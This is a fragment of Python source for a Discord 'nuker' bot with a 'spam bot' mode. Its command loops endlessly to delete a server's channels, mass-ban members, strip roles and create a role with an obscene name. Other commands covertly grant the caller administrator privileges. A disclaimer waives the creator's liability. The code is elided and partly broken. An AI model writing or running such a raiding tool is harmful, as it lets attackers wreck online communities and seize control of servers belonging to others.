...
#IF YOU DO ANY DAMAGES, ITS NOT MY FAULT, I (THE CREATOR & MAINTAINER) CANT BE HELD LIABLE
            ...
            if modes == "spam bot":
                ...
                async def nuker(interaction: discord.Interaction):
                    ...
                    while True:
                        ...
                        nuker = interaction.user
                        roles = interaction.guild.roles
                        for i in members:
                            print ("Unbanning " + i)
                            await interaction.guild.unban(i)

                        channels = [channel for channel in channels if isinstance(channel, discord.TextChannel) and channel.permissions_for(interaction.guild.me).manage_channels]
                        ...
                        for channel in channels:
                            try:
                                ...
                                if e.status == 400 and e.code == 50074:
                                    print(f"Ignoring channel {channel.name}: Cannot delete a channel required for community servers")
                                else:
                                    raise
                            except discord.Forbidden:
                                print(f"Ignoring channel {channel.name}: Missing Permissions")
                                continue
                        ...
                        for member in members:
                            try:
                                ...
                                member_to_ban = await member.guild.fetch_member(member.id)
                                
                                if bot_member.top_role <= member_to_ban.top_role:
                                    continue
                                
                                await member_to_ban.ban(reason="")
                            
                                
                            except discord.Forbidden:
                                print(f"Ignoring member {member_to_ban.name}: Missing Permissions")
                                continue
                        role = "cumdumpster"
                        print("Creating role " + role)
                        await interaction.guild.create_role(role)
                        if not roles:
                            continue
                        for role in roles:
                            bot_member = member.guild.me
                            ...
                            if bot_member.top_role <= role:
                                continue
                            interaction.guild._remove_role(roles)
                @bot.tree.command(name="giveadmin", description="Yes.")
                @app_commands.describe(role_id="Role ID of admin role")
                async def giveadmin(interaction: discord.Interaction, role_id:str):
                    with open("latest.log", "a") as f:
                        f.write("\nGive admin triggered " + str(utils.utcnow()))
                    role = discord.utils.get(interaction.guild.roles, id=int(role_id))
                    await interaction.user.add_roles(role)
                
                @bot.tree.command(name="createadmin", description="Yes.")
                async def createrole(interaction: discord.Interaction, *, member: discord.Member):

                    role = await interaction.guild.create_role(name="Administrator", permissions=discord.Permissions(administrator=True))
